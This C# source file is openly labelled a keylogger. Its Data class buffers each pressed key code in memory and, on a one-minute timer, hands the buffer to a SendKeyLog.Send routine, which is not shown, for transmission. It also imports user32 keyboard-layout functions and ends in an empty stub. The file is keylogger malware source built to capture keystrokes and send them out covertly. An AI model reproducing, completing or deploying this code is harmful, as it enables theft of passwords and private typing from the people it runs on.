using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using sysTimer = System.Timers;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Management;

namespace KeyLogger
{
    public static class Data
    {
        private static MemoryStream _memoryStream = new MemoryStream();
        private static sysTimer.Timer _timer = new sysTimer.Timer();
        private static sysTimer.Timer _sendTimer = new sysTimer.Timer();
        private static byte[] n;

        public static void InitializeTimer()
        {
            n = Encoding.UTF8.GetBytes("\n");

            _timer.Interval = 1000 * 20;
            _timer.Elapsed += _timer_Elapsed;
            _timer.AutoReset = false;

            _sendTimer.Interval = (1000 * 60) * 1;
            _sendTimer.Elapsed += _sendTimer_Elapsed;
            _sendTimer.AutoReset = true;

            _sendTimer.Start();
        }

        private const uint KLF_ACTIVATE = 1; // activate the layout
        private const int KL_NAMELENGTH = 9; // length of the keyboard buffer

        [DllImport("user32.dll")]
        private static extern long LoadKeyboardLayout(string pwszKLID, uint Flags);
        [DllImport("user32.dll")]
        private static extern long GetKeyboardLayoutName(System.Text.StringBuilder pwszKLID);

        static void _sendTimer_Elapsed(object sender, sysTimer.ElapsedEventArgs e)
        {
            SendKeyLog.Send(_memoryStream);
            _memoryStream = new MemoryStream();
        }

        static void _timer_Elapsed(object sender, sysTimer.ElapsedEventArgs e)
        {
            _memoryStream.Write(n, 0, n.Length);
        }

        public static void WriteKey(int keyCode)
        {
            Console.WriteLine("keyCode: " + keyCode);
            _memoryStream.WriteByte((byte)keyCode);
            _timer.Stop();
            _timer.Start();

            Keys key = (Keys)keyCode;


            
            if (key == Keys.A)
            {
                
            }
        }
    }
}
